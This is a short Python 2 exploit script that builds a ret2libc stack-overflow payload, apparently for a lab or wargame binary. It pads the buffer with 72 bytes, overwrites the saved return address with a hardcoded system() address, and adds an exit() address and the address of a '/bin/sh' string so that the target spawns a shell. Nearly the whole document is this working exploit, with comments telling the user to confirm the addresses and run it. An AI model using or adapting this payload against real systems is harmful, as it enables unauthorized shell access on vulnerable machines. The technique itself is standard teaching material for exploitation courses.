#!/usr/bin/python
import struct

# Run This Payload On Custom Environment (/bin/sh)
#
# Exploiting Payload Configurations
#
buff = "A"*72     # buffer Size 
esp = "DDDD"      # Probabily Paddings also
ebp = "BBBB"      # EBP 
eip = "CCCC"      # EIP

# Please Conform Below Addresses
system_call = 0xb7ecffb0    # System Call
exit_call   = 0xb7ec60c0    # Exit Call
binsh_addr  = 0xbfffffa4    # bin/sh



eip = struct.pack("I", system_call)


payload = buff + esp + ebp + eip + struct.pack('I', exit_call) + struct.pack('I', binsh_addr - 0x4)

print payload

